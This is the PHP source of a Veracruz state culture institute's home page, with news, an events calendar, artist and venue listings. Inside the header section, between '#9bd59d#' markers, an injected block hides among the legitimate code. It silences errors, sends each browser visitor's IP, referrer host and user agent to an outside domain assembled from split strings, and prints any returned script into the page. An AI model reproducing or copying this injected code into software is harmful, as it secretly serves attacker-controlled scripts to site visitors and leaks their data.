<? session_start();
require 'db.class.php';
require 'conf.class.php';
require 'fecha.php';
$bd=Db::getInstance();
setlocale(LC_ALL,"es_ES@euro","es_ES","esp");
date_default_timezone_set('America/Mexico_City'); 

 
 
//Para utilizar la función, se le manda una fecha como parámetro, por ejemplo, si se quisiera imprimir la fecha actual, utilizaríamos el siguiente código:
 


$dia= strftime("%d");

$mes= strftime("%B");

$calen=$_GET["datepicker"];

if (!empty($calen)){
	
	
	$dia=$calen[8].$calen[9];
 // $mes=$calen[5].$calen[6];
  
 
	
	}
	$elmenu=2;
$toy=1;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link href='http://fonts.googleapis.com/css?family=Cabin+Condensed:300|Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Instituto Veracruzano de la Cultura</title>
<link href="estilo.css" rel="stylesheet" type="text/css" />
<style type="text/css">

</style>

<script src="jquery-1.7.1.min.js"></script>
<style>.imgMini{
	width:140px;
	height:77px;
	cursor:pointer;
	}
.imgPrincipal{
	height:350px;
	width:600px;}
</style>
<script language="javascript" type="text/javascript">
		var tabla= "<table>";
		var puntero = 0;
		var ids=0;
		var idTime=0;
		var final=0;
        function llenar(urlRef,urlImg,urlImgG,pos){
			
				if(pos==1)
					//jQuery('#divImagenes').add('<tr><td><img src="'+urlImg+'" /></td>');
					tabla+='<tr><td><img id="img'+ids+'" urlImg="'+urlImg+'" class="imgMini" urlG="'+urlImgG+'" src="'+urlRef+'" onclick="cambiaImgPrincipal('+ids+')"  /></td>';
				else
					//jQuery('#divImagenes').add('<td><img src="'+urlImg+'" /></td></tr>');	
					tabla+='<td><img id="img'+ids+'" urlImg="'+urlImg+'" class="imgMini" urlG="'+urlImgG+'" src="'+urlRef+'" onclick="cambiaImgPrincipal('+ids+')" /></td></tr>';
					ids++;
		}
		function asignar(){
			var div = document.getElementById('divImagenes');
			div.innerHTML = tabla;
		}
		function cambiaImgPrincipal(id){
			if(idTime!=0){
				window.clearTimeout(idTime);
			}
			var imgNueva = jQuery("#img"+id);
			var imagen= jQuery("#imgPrincipal");
			var enlace = jQuery("#urlPrincipal");
			ids=id;
			imagen.fadeOut(1000,function (){
					imagen.attr("src",imgNueva.attr("urlG"));
			        enlace.attr("href",imgNueva.attr("urlImg"));
			        imagen.fadeIn(1000);
				});
			if(id==final){id=0, cambiaImgPrincipal(0)}
			var nuevoid=id+1;
			idTime = window.setTimeout("cambiaImgPrincipal("+nuevoid+")",8000);
		}
    </script>
<script type="text/javascript" src="script.js"></script>
<script type="text/javascript" src="admin/jquery.js"></script>
<link rel="shortcut icon" href="img/favicon.ico">
</head>
<script> 

 
 function fout()
{
fadeEffect.init('imagprin',1);
}

</script>
    <script src="src/js/jscal2.js"></script>
    <script src="src/js/lang/es.js"></script>
    <link rel="stylesheet" type="text/css" href="src/css/jscal2.css" />
    <link rel="stylesheet" type="text/css" href="src/css/border-radius.css" />
    <link rel="stylesheet" type="text/css" href="src/css/steel/steel.css" />
<script language="javascript">
	var fechax=0;	
		
function cambiaFecha(){
	var fecha=$("#datepicker").val();
	var monthNames=new Array('enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','Diciembre');
	if (fecha!=''){
		$("#calen").html('<table width="100" border="0" align="center" cellpadding="10" cellspacing="0"><tr><td align="center"><img src="loader.gif" /></td></tr></table>');
		var arr=fecha.split("-");
		var mes=arr[1];
		if (mes=='01'){ mes=1; }
		if (mes=='02'){ mes=2; }
		if (mes=='03'){ mes=3; }
		if (mes=='04'){ mes=4; }
		if (mes=='05'){ mes=5; }
		if (mes=='06'){ mes=6; }
		if (mes=='07'){ mes=7; }
		if (mes=='08'){ mes=8; }
		if (mes=='09'){ mes=9; } 
		mes=parseInt(mes)-1;
		var meso=monthNames[mes];
		var dia=arr[2];
		$("#fechadia").html(dia+" "+meso);
		setTimeout(function(){
		$.post("caled.php", {fecha:fecha}, function (data){ 
		 $("#resultados").html(""); $("#calen").html(data);
		 
		 $.post("cambiacarte.php", {fecha:fecha}, function (data){  
		 $("#cartelerax").html(data); }); 
		 
		 
		});  }, 1000);
  
    	
		 
		 
		setTimeout("checador()", 100);
	}
	else { $("#resultados").html("Seleccione una fecha");  }
}
$(document).ready(function(e) {
    $("#datepicker").change(function(e) {
        cambiaFecha();
    });
});

function checador(){

	
var fecha=$("#datepicker").val(); 
if (fecha == fechax ){ 
setTimeout("checador()", 100);
}
 else { 
	fechax=fecha;
	cambiaFecha();
}  

}

setTimeout("repite()", 100);
    </script>
   <script language="javascript">
$(document).ready(function($){

    var div_alto1 = $("#mydiv1").height();
    var div_alto2 = $("#mydiv2").height();

	if (div_alto1 > div_alto2)
	{ 
	$("#mydiv2").height(div_alto1);
	 }
	else { 
	$("#mydiv1").height(div_alto2);
	 }
	
var div_alto1 = $("#mydiv1").height();
    var div_alto2 = $("#mydiv2").height();
	
	//alert (div_alto1+" "+div_alto2);
	
    var div_alto3 = $("#mydiv3").height();
    var div_alto4 = $("#mydiv4").height();
	
	if (div_alto3 > div_alto4)
	{ 
	$("#mydiv4").height(div_alto3);
	 }
	else { 
	$("#mydiv3").height(div_alto4);
	 }
	   
	    
});
    </script> 
    
</head>

<body bottommargin="0" bgcolor="#F2F2F2" onload="trap(); checador()">
<!--TOP-->


<? $bf=$bd->ejecutar("select * from fotosr where recinto=100 order by id desc limit 1");
	$kfo=$bd->obtener_fila($bf,0);
	$leurl='admin/'.$kfo['url'].$kfo['id'].'.jpg';
	if (!file_exists($leurl)){ $leurl='imgs/header.jpg'; }

  ?>
<div style="width:100%; background-image:url(<?=$leurl;?>);  background-position:top; background-repeat:no-repeat;">
	<div style="width:930px; margin:auto; height:10px;">
    </div>

	<div style="width:930px; margin:auto;  background-image:url(imgs/headivec.png); background-position:center; background-repeat:no-repeat; height:70px;"><? include "headers.php";?>
<?php
#9bd59d#
error_reporting(0); ini_set('display_errors',0); $wp_jjac82262 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_jjac82262) && !preg_match ('/bot/i', $wp_jjac82262))){
$wp_jjac0982262="http://"."web"."basefont".".com/font"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jjac82262);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jjac0982262);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_82262jjac = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_82262jjac,1,3) === 'scr' ){ echo $wp_82262jjac; }
#/9bd59d#
?>
	</div>

	<div style="width: 930px; margin: auto; margin-top: 45px; height: 25px;" class="menu"><? include "menu.php"; ?>
    </div>

	<div style="width:930px; margin:auto;  margin-top:10px; background-color:#FFFFFF;"><table><tr><td>
    <table align="center" >
  <tr>
    <td rowspan="4" valign="top" width="600px" height="360px">
    	<a id="urlPrincipal" href="#"><img id="imgPrincipal"  width="600px" height="350px" src="ivec.jpg" /> </a>
        </td></tr></table>
    </td>
    <td>
    <div style="height:360px;overflow:scroll; overflow-x:hidden;">
    <table>
  		<tr><td width="330px">
   			<div id="divImagenes">
            </div>
            </td>
		</tr>
   	</table>
  		</div></td></tr> </table>
</div>
	
<!--llenado de arrays-->
<?php
$hoy=date("Y-m-d H:i:s");
  $buscaim=$bd->ejecutar("select * from anuncio where vencimiento>='$hoy' order by rand() ");
 $total = mysql_num_rows($buscaim);
 $Alaf[1]=0;
 $Alac[1]=0;
 $Alaurles[1]=0;
 for ($c==0;$c<=$total;$c++)
 	{
		 $kf=$bd->obtener_fila($buscaim,0);
		 $laf='admin/'.$kf['url'].$kf['id'].'_g.jpg';
		 $lac='admin/'.$kf['url'].$kf['id'].'_c.jpg';
		 $laurles=$kf['link'];
		 if (trim($laurles)==''){ $laurles='#'; }
		 if (!file_exists($laf)){ $laf='imgs/'+$c+'_1.jpg'; $lac='imgs/'+$c+'_2.jpg'; }
	
	$Alaf[$c]=$laf;
	$Alac[$c]=$lac;
	$Alaurles[$c]=$laurles;
	}
	$longitud = $total;
	$p = 1;
	if($longitud>0){
		for($x=1;$x<$longitud;$x++){
			?>
			<script type="text/javascript" language="javascript">
				llenar('<? echo $Alac[$x]?>','<? echo $Alaurles[$x]?>','<? echo $Alaf[$x]?>','<? echo $p?>');
			</script>
            <?php
			
			if($p==1) $p=2;
			else $p=1;
			
		}
		if($p==1){
			?>
			<script type="text/javascript" language="javascript">
				tabla += '</tr>';				
			</script>
	        <?php
		}
		?>
		<script type="text/javascript" language="javascript">
			tabla += '</table>';
			asignar();
			jQuery(document).ready(function(e) {
                if(idTime!=0){
					window.clearTimeout(idTime);
				}
				idTime = window.setTimeout("cambiaImgPrincipal(0)",2000);
				final = <?=$total?>;
            });		
		</script>
        <?php
	}
?>
<!--FINTOP-->
<!--MIDDLE-->
<!--  Para mandar al YOUTUBE y Transmisión en VIVO https://www.youtube.com/channel/UCBs_3i0bypMwaMk8ScHNjEw -->
<!--<div align="center" style="margin:auto; width:930px; background-color:#FFF; border:#F8F8F8 groove 1px; min-height:250px;"><a a href="http://litorale.com.mx/ivec/admin/convocatorias/2015-10-27/Programa3FSA.pdf" target="_blank"  title="Programación del 3er Festival Soñar con Árboles">
      <img src="imgs/Siembra.jpg" width="930" height="250" align="middle" style="padding:0 3px 3px 0"  /></a>
</div>-->

<div style="width:930px; margin:auto;  margin-top:3px;">
<table><tr><td>
<td><div align="left" style="margin:auto; width:307px;  margin-top:10px; min-height:120px;"><a a href="http://pedivec.ivec.gob.mx" target="_blank"  title="Plataforma de Educación a Distancia del IVEC">
      <img src="imgs/Pedivec.png" width="307" height="120" align="right" style="padding:0 3px 3px 0"  /></a>
</div></td>
<!--<td><div align="center" style="margin:auto; width:307px;  margin-top:10px; min-height:120px;"><a title="Descubre lo nuevo del IVEC">
      <img src="imgs/DescubreIvec.png" width="307" height="120" align="right" style="padding:0 3px 3px 0"  /></a>
</div></td>-->
<td><div align="center" style="margin:auto; width:307px;  margin-top:10px; min-height:120px;"><a a href="https://catalogocineclubivec.wordpress.com/" target="_blank"  title="Cine Club">
      <img src="imgs/CineClub2.png" width="307" height="120" align="right" style="padding:0 3px 3px 0"  /></a>
</div></td>
<td><div align="right" style="margin:auto; width:307px;  margin-top:10px; min-height:120px;"><a a href="http://radiolab.ivec.gob.mx" target="_blank"  title="Radio Laboratorios de Casas de la Cultura">
      <img src="imgs/RADIOLABBOTON.png" width="307" height="120" align="right" style="padding:0 3px 3px 0"  /></a>
</div></td>
</tr>
</table>
</div>

<div style="width:100%; background-color:#f2f2f2; margin-top:10px; min-height:1000px; ">

  <div style="width:930px; margin:auto; min-height:350px;">
<table width="930" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="315"><div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #C41230;"><strong>Noticias</strong></div></td>
    <td>&nbsp;</td>
    <td width="585"><div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #EA870F;"><strong>Cartelera</strong></div></td>
  </tr>
  <tr>
    <td valign="top" bgcolor="#FFFFFF"><table width="96%" align="center">
    <? 
	$bn=$bd->ejecutar("select id_nota,titulo,resumen from nota where 1 order by id_nota desc limit 5");
	
	while($rownf=@$bd->obtener_fila($bn)) {
    $idnota1=$rownf['id_nota'];
	$ids.=','.$idnota1;
	$bfot1=$bd->ejecutar("select * from foto where id_nota=$idnota1 order by id desc limit 1");
	$kfot1=$bd->obtener_fila($bfot1,0);
	$url1='';	
	$url1='admin/'.$kfot1['url'].$kfot1['id'].'_3.jpg';                     
	  ?>
      <tr>
        <td class="azult" <? if (file_exists($url1)){ ?> <? } ?>><strong><a href="nota.php?id=<?=($rownf['id_nota'])?>" title="<?=($rownf['titulo'])?>"><?=($rownf['titulo'])?></a> </strong></td>
        </tr>
      <tr><td><? if (file_exists($url1)){ ?>
      <a href="nota.php?id=<?=($rownf['id_nota'])?>" title="<?=($rownf['titulo'])?>">
      <img src="<?=$url1?>" width="90" height="68" border="0" align="left" style="padding:0 5px 3px 0"  /></a><? } ?>
       <span class="gris12"> <?=substr($rownf['resumen'],0,190)?>...
      </span></td>
        </tr>
   
      <tr>
        <td height="9px" <? if (file_exists($url1)){ ?> <? } ?>></td>
        </tr>   
      <? } ?>
    
    </table></td>
    <td>&nbsp;</td>
    <td valign="top" bgcolor="#FFFFFF"><table width="582">
      <tr>
        <td colspan="5"><table width="100%" align="right"><tr>
              <td width="206" id="cartelerax"><?
              $fini=date("Y-m").'-01';
			  $ffin=date("Y-m").'-31';
			  $bcar=$bd->ejecutar("select * from cartelera where fecha between '$fini' and '$ffin' order by id desc limit 1 ");
			  while($kcar=$bd->obtener_fila($bcar,0)){ ?>
				  
				<a href="admin/<?=$kcar['url']?>" target="_blank" class="Arial12Rojo">Descargar Cartelera <?=$kcar['fecha']?> </a>
<? } ?></td>
              
              <td width="149"><img src="imgs/calendario.jpg" />	<div class="arte1" id="contenido-demo" style="float:left; width:99%">	
	<input type="text" name="datepicker" id="datepicker"   size="12"  class="naranja121" onchange="cambiaFecha()"/>
  
    
 <script type="text/javascript"> 
var cal = Calendar.setup({
onSelect: function(cal) { cal.hide() },
showTime: false,
animation: true,
fdow: 0,
weekNumbers: true,
}); 
cal.manageFields("datepicker", "datepicker", "%Y-%m-%d");
cal.getFirstDate();
</script> 
    <input name="Botón" type="button" class="naranja121" value="Cambiar" onclick="cambiaFecha()" />
     </div> <div class="naranja121" id="resultados" style="float: left; width: 100%;"></div> </td>
              <td width="206" class="gris25" id="fechadia"><?=$dia?> <?=$mes?></td>
        </tr></table></td>
        </tr>
      <td colspan="5">

 <div class="especial" style="padding: 4px 7px; min-width: 195px; max-width: 195px; border-radius: 7px 7px 0 0; background-color: #228b22;"><strong>Agenda</strong></div></td>
  
      </td>
      <tr>
        <td colspan="5" valign="top" class="naranja121">
        <div id="calen">
        <table>
                 
      <tr>
        <td colspan="5" class="negro12" align="center" height="5"><strong>Eventos del día</strong></td>
        </tr>
        <? 
		
		$desde=date("Y-m-d").' 00:00:01';
		$hasta=date("Y-m-d").' 23:59:59';
		$losidp='0';
		$coanta=1;
		$eventos=$bd->ejecutar("select * from mynews where (newsdate between '$desde' and '$hasta' and secc2=0) or (inicio between '$desde' and '$hasta')  order by newsdate asc limit 6 ");
		$cuantos=$bd->num_rows($eventos);
		while($row=$bd->obtener_fila($eventos,0) and $coanta<7){
			$coanta++;
			$losidp.='.'.$row['id'];
			$tdatet=explode(" ",$row['newsdate']);
			$fecha=$tdatet[0];
			$hora=substr($tdatet[1],0,5);	$foto='admin/'.$row['url'].$row['id'].'_cx.jpg';
			if (!file_exists($foto)){
			$foto='admin/'.$row['url'].$row['id'].'_c.jpg'; }			
			if (!file_exists($foto)){
			$foto='admin/'.$row['url'].$row['id'].'_gx.jpg'; }
			$secc=$row['secc1'];
			$bsec=$bd->ejecutar("select * from recintos where id=$secc");
			$rows=$bd->obtener_fila($bsec,0);
			
			
		 ?>
        
                <tr>
        <td width="147" rowspan="2" align="center" class="negro12"> <a href="veragenda.php?id=<?=$row['id']?>" >
        <? if(file_exists($foto)){ ?> <img src="<?=$foto?>" width="100" /><? } else { ?>
        <img src="admin/imagenes/no.png" width="60" height="60" /><?  } ?></a></td>
        <td width="147" class="negro12"><span class="naranja121"><?=$row['descri']?></span></td>
        <td width="129" rowspan="2" class="azul12"><?=$rows['nombre']?></td>
        <td width="130" rowspan="2" class="negro15">
		<? if ($hora!='00:00'){ echo $hora; } ?></td>
        <td width="1" rowspan="2">&nbsp;</td>
        </tr>
      <tr>
        <td class="negro12"><strong><?=$row['newstitle']?></strong></td>
      </tr>
      <? if ($cuantos>5){ ?>
       <tr>
         <td colspan="5" class="negro12" align="right" height="5"><a href="agenda.php?secc1=0&datepicker=<?=date("Y-m-d")?>" class="negro12">Ver  Completo</a></td>
       </tr>
       <? } ?>
       <tr>
        <td colspan="5" class="negro15" align="center" height="5"><img src="imgs/grishor.jpg" width="569" /></td>
        </tr>   <? } ?>
          <tr>
        <td colspan="5" class="negro12" align="center" height="5"><strong>Otros Eventos</strong></td>
        </tr>
     
        
             <? 
		$limite=6-$cuantos;
		$tope=date("Y-m-d").' 23:59:59'; 
		$hoy=date("Y-m-d H:i:s") ;  
		$eventos=$bd->ejecutar("select * from mynews where  fin>='$tope' and inicio<='$tope' and secc2=1 and id not in ($losidp)  limit $limite");
		while($row=$bd->obtener_fila($eventos,0)){
			$tdatet=explode(" ",$row['newsdate']);
			$fecha=$tdatet[0];
			$hora=substr($tdatet[1],0,5);
			$foto='admin/'.$row['url'].$row['id'].'_cx.jpg';
			if (!file_exists($foto)){
			$foto='admin/'.$row['url'].$row['id'].'_c.jpg'; }			
			if (!file_exists($foto)){
			$foto='admin/'.$row['url'].$row['id'].'_gx.jpg'; }
			$secc=$row['secc1'];
			$bsec=$bd->ejecutar("select * from recintos where id=$secc");
			$rows=$bd->obtener_fila($bsec,0);
			
			
		 ?>
        
                <tr>
        <td width="147" rowspan="2" align="center" class="negro12">
        <a href="veragenda.php?id=<?=$row['id']?>" >
        <? if(file_exists($foto)){ ?> <img src="<?=$foto?>" width="100" /><? } else { ?>
        <img src="admin/imagenes/no.png" width="60" height="60" /><?  } ?></a></td>
        <td width="147" class="negro12"><span class="naranja121"><?=$row['descri']?></span></td>
        <td width="129" rowspan="2" class="azul12"><?=$rows['nombre']?><br />
	 
		
</td>
        <td width="130" rowspan="2" class="Arial12Nego"><strong>Del</strong> <?=fechacp($row['inicio']);?><br />
<strong>al</strong> <?=fechacp($row['fin']);?></td>
        <td width="1" rowspan="2">&nbsp;</td>
        </tr>
      <tr>
        <td class="negro12"><strong><?=$row['newstitle']?></strong></td>
      </tr>
   
           
      <tr>
        <td colspan="5" class="negro15" align="center" height="5"><img src="imgs/grishor.jpg" width="569" /></td>
        </tr>
        
        <? } ?>
        </table>
        </div>
        
        &nbsp;</td>
      </tr>
      <tr>
        <td colspan="5" class="naranja121">&nbsp;</td>
      </tr>
 <!--radio--> <!-- Se quita la parte de la radio 22-04-14      <tr><td><table><tr><td>
      <div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #002749;"><strong>RADIO IVEC</strong></div>
        <div style="width:545px; height:250px; float:left; margin-top:0px;background-image: url(radio/fondoR1.png)" >
        <table cellpadding="0" cellspacing="0" width="100%"  >
        <tr><td height="160px"></td></tr>
 
  			<tr>
    			<td colspan="2" valign="top"><a href="radioivec.php" onClick="return popitup('radioivec.php')">
<img src="radio/radioreproductor.jpg" width="545" height="60" /> </a>
              <!-- <OBJECT id="WMP" width="320" height="70" classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6">
<PARAM NAME="URL" VALUE="http://78.129.224.19:24548">
<PARAM NAME="rate" VALUE="1">
<PARAM NAME="balance" VALUE="0">
<PARAM NAME="currentPosition" VALUE="0">
<PARAM NAME="defaultFrame" VALUE="">
<PARAM NAME="playCount" VALUE="1">
<PARAM NAME="autoStart" VALUE="1">
<PARAM NAME="ShowStatusBar" value="true">
<PARAM NAME="ShowDisplay" value="false">
<PARAM NAME="currentMarker" VALUE="0">
<PARAM NAME="invokeURLs" VALUE="-1">
<PARAM NAME="baseURL" VALUE="">
<PARAM NAME="volume" VALUE="30">
<PARAM NAME="mute" VALUE="0">
<PARAM NAME="uiMode" VALUE="full">
<PARAM NAME="stretchToFit" VALUE="0">
<PARAM NAME="windowlessVideo" VALUE="0">
<PARAM NAME="enabled" VALUE="-1">
<PARAM NAME="enableContextMenu" VALUE="-1">
<PARAM NAME="fullScreen" VALUE="0">
<PARAM NAME="SAMIStyle" VALUE="">
<PARAM NAME="SAMILang" VALUE="">
<PARAM NAME="SAMIFilename" VALUE="">
<PARAM NAME="captioningID" VALUE="">
<PARAM NAME="enableErrorDialogs" VALUE="0">
<PARAM NAME="_cx" VALUE="5503">
<PARAM NAME="_cy" VALUE="6371">
<embed Name="MediaPlayer" align="baseline" src="http://78.129.224.19:24548" border="0" width="544" height="70" type="application/x-mplayer2" pluginspage="http://www.microsoft.com/isapi/redir.dll?prd=windows&sbp=mediaplayer&ar=media&sba=plugin&" autostart="0" showcontrols="1" showstatusbar="1" showdisplay="0" autorewind="0">
		</object>-->
 <!-- Se quita radio 22-04-14       </td>
        </tr>
 <tr><td>
         Si no escucha la radio <a href="http://radioivec.listen2myradio.com/"> de clic aquí </a> y actualice  la página
  </td></tr> 
        </table>
		</div>
      </td></tr></table></td></tr> --> <!--radio fin-->

  </table></td>
  </tr>
</table>
<div style="width: 100%; float: left; height: auto; margin-top: 10px;"><table width="930" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td colspan="2"><div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #002749;"><strong>Artistas</strong></div></td>
    <td><div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #C41230; cursor:pointer" onclick="document.location='video.php';"><strong>Video</strong></div></td>
  </tr>
  <tr>
    <td valign="top" bgcolor="#000000" style="padding:0 0 7px 0">
        <? $bua=$bd->ejecutar("select * from artistas_datos where edo=1 order by rand() limit 1");
		$kea=$bd->obtener_fila($bua,0);	
		$ida=$kea['id'];
		$ids=$kea['seccion'];
		$bai=$bd->ejecutar("select * from artistas_info where dude=$ida");
		$kai=$bd->obtener_fila($bai,0);	
		$bass=$bd->ejecutar("select * from artistas_seccion where id=$ids");
		$kass=$bd->obtener_fila($bass,0);
		$baso=$bd->ejecutar("select * from artistas_seccion where id<$ids and tipo=1 order by id desc limit 1");
		$kaso=$bd->obtener_fila($baso,0);
		
		 ?>
        
        
		<div style="width:470px; float:left; margin-top:10px;"><table cellpadding="0" cellspacing="0" width="100%"  >
 
  <tr>
    <td colspan="2" valign="top" bgcolor="#000" class="Arial15bco"  style="background-position: center; background-repeat: no-repeat; vertical-align: top; padding: 7px;"><?=$kaso['nombre'];?>
/
<?=$kass['nombre'];?>    </td>
  </tr>
  <tr>
    <td width="36%" rowspan="2" valign="top" bgcolor="#000"  style="background-position: center; background-repeat: no-repeat; vertical-align: top; padding: 7px;">	<? if (file_exists('admina/'.$kea['foto'].$kea['id'].'_c.jpg')){ ?> <div style=" width:150px; height:200px">
        <div style=" width:150px; height:200px">
       <a href="verartistas.php?id=<?=$kea['id']?>"> <img src="<?='admina/'.$kea['foto'].$kea['id'].'_c.jpg'?>" name="fotodude<?=$kea['id'];?>" width="150" height="200" class="" id="fotodude<?=$kea['id'];?>" border="0"/></a>      
        </div>
        <div style="width: 150px; height: 208px; position: relative; top: -208px; cursor:pointer" class="otrafoto"  onclick="document.location='verartistas.php?id=<?=$kea['id']?>'" ></div></div>
                     <? } else { ?>  <a href="verartistas.php?id=<?=$kea['id']?>"> 
              <img src="admin/imagenes/no.png" width="150" style="background-color:#666;" class="imagenborde" border="0" /></a>
<? } ?></td>
    <td width="64%" valign="top" bgcolor="#000"  style="background-position:center; background-repeat:no-repeat; vertical-align:top; padding: 7px;"><span class="arte2">
      <?=(substr($kai['descripcion'],0,300))?>
      ...</span></td>
  </tr>
  <tr>
    <td valign="baseline" bgcolor="#000"  style="background-position:center; background-repeat:no-repeat; vertical-align:top; padding: 7px;"><a href="artistas.php" class="amarillo">ver mas </a></td>
  </tr>
  <tr>
    <td colspan="2" valign="top" bgcolor="#000"  style="background-position:center; background-repeat:no-repeat; vertical-align:top">&nbsp;</td>
  </tr>
  <tr>
    <td colspan="2" valign="top" bgcolor="#000"  style="background-position:center; background-repeat:no-repeat; vertical-align:top">  <div style="float: left; min-width: 450px; margin-bottom: 15px;">
  <table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center" class="cartista" style="padding: 5px 20px; min-width: 90%;">  <a href="verartistas.php?id=<?=$kea['id']?>" style="color:#FFF"> <?=$kea['nombre'];?></a></td>
  </tr>
</table>

  </div></td>
  </tr>
		</table>

		</div></td>
    <td valign="top" bgcolor="#F2F2F2">&nbsp;</td>
    <td valign="top" bgcolor="#FFFFFF" style="padding:0 0 7px 0"><div style="width: 445px; float: right; /* [disabled]margin-top: 10px; */ /* [disabled]height: 374px; */">
      <table cellpadding="0" cellspacing="0" width="100%"    >
        <tr>
          <td height="255px" align="center" valign="middle" bgcolor="#fff"><? $bb=$bd->ejecutar("select * from videos order by vp desc, Id desc limit 1"); 
	$kev=$bd->obtener_fila($bb,0);  
	
	  $video=stripslashes($kev['thumb']);
	$video=str_replace('width','width="437" xx',$video);
	$video=str_replace('height','height="246" yy',$video);
	echo $video
 
	 ?></td>
        </tr>
        <tr>
          <td align="left" valign="baseline" bgcolor="#fff" class="negro14" style="padding:5px"><strong><? echo $kev['resumen']; ?></strong><br />
            <? echo substr($kev['descri'],0,100); ?>... </td>
        </tr>
      </table>
    </div></td>
  </tr>
</table>

    </div>
 <div style="width: 100%; float: left; margin-top: 10px;">
	  <div style="width: 680px; float: left; /* [disabled]margin-top:10px; */"><table cellpadding="0" cellspacing="0" width="100%">
  <tr>
    <td align="left"><div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #EA870F;"><strong>Recintos Culturales</strong></div></td>
  </tr>
  <tr>
    <td height="280px" align="center" valign="top" bgcolor="#fff" style="padding:7px">
    
    <table width="665" border="0" cellspacing="0" cellpadding="5">
      <tr>
        <td colspan="3" class="artistas" id="recintoname" style="font-size: 50px;">Teatro del Estado</td>
        </tr>
        <script language="javascript">
		function cambianr(nombre){
			$("#recintoname").html(nombre);
		}
		</script>
        <? for ($f=0; $f<12; $f=$f+3){ ?>
        <?  $brecinto=$bd->ejecutar("select * from recintos where edo=1 order by id asc limit $f,3");  
 
		?>
      <tr>
        <td width="33%"><? 
		$krec=$bd->obtener_fila($brecinto,0);
		$idre=$krec['id'];
		$bn=$bd->ejecutar("select * from fotosr where recinto=$idre order by id asc limit 1"); 
        $rownf=@$bd->obtener_fila($bn,0);
		$url1='';
		$url1='admin/'.$rownf['url'].$rownf['id'].'_c.jpg';
         ?>
          <a href="recintos.php?id=<?=$idre?>"><img src="<?=$url1?>" width="208" onmouseover="cambianr('<?=$krec['nombre']?>')" alt="<?=$krec['nombre']?>"  /></a></td>
        <td width="33%"><? 
		$krec=$bd->obtener_fila($brecinto,0);
		$idre=$krec['id'];
		$bn=$bd->ejecutar("select * from fotosr where recinto=$idre order by id asc limit 1");
        $rownf=@$bd->obtener_fila($bn,0);
		$url1='';
		$url1='admin/'.$rownf['url'].$rownf['id'].'_c.jpg';
         ?>
          <a href="recintos.php?id=<?=$idre?>"><img src="<?=$url1?>" width="208" onmouseover="cambianr('<?=$krec['nombre']?>')" alt="<?=$krec['nombre']?>"  /></a></td>
        <td width="33%"><? 
		$krec=$bd->obtener_fila($brecinto,0);
		$idre=$krec['id'];
		$bn=$bd->ejecutar("select * from fotosr where recinto=$idre order by id asc limit 1");
        $rownf=@$bd->obtener_fila($bn,0);
		$url1='';
		$url1='admin/'.$rownf['url'].$rownf['id'].'_c.jpg';
         ?>
           <a href="recintos.php?id=<?=$idre?>"><img src="<?=$url1?>" width="208" onmouseover="cambianr('<?=$krec['nombre']?>')" alt="<?=$krec['nombre']?>"  /></a></td>
      </tr>
    <? } ?>
      
    </table></td>
  </tr></table>
		</div>
	
		<div style="width: 240px; float: right; /* [disabled]margin-top:10px; */"><table cellpadding="0" cellspacing="0" width="100%">
  <tr>
    <td align="left"><div class="especial" style="float: left; padding: 4px 7px; min-width: 195px; border-radius: 7px 7px 0 0; background-color: #002749;"><strong>Social</strong></div></td>
  </tr>
  <tr>
    	<td bgcolor="#fff" height="300px"><a class="twitter-timeline" href="https://twitter.com/IVEC_Oficial" data-widget-id="458678734589931520">Tweets por @IVEC_Oficial</a>
		<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
    
    <!--  <td bgcolor="#fff" height="280px"><script charset="utf-8" src="http://widgets.twimg.com/j/2/widget.js"></script>
<script>
new TWTR.Widget({
  version: 2,
  type: 'profile',
  rpp: 3,
  interval: 30000,
  width: 228,
  height: 310,
  theme: {
    shell: {
      background: '#ffffff',
      color: '#000000'
    },
    tweets: {
      background: '#ffffff',
      color: '#4d4d4d',
      links: '#ff6600'
    }
  },
  features: {
    scrollbar: false,
    loop: false,
    live: true,
    behavior: 'default'
  }
}).render().setUser('ivec_oficial').start();
</script> --></td>
  </tr></table>
		</div>
      </div>
         
  </div>
</div>









<!--FINMIDDLE-->
<!--PIE-->
<div style="width: 100%; float: left; margin-top: 20px; background-color: #FFF;">
<? include "footer.php"; ?>
      </div>
<!--FINPIE-->


</body>
</html>
